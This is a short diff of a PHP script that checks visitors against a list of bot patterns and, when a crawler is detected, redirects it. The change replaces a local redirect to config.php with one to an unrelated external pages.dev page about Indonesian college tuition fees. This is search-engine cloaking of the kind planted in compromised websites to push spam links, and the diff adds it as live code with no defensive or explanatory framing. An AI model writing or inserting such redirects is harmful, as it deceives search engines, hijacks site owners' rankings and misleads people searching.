@@ -24,7 +24,7 @@ foreach ($botPatterns as $bot) {
 
 // Bot ise amp.php'ye yönlendir
 if ($isBot) {
-    header("Location: config.php");
+    header("Location: https://punten-neng.pages.dev/staika/daftar/biaya-kuliah-stai-al-kamal/");
     exit;
 }
 
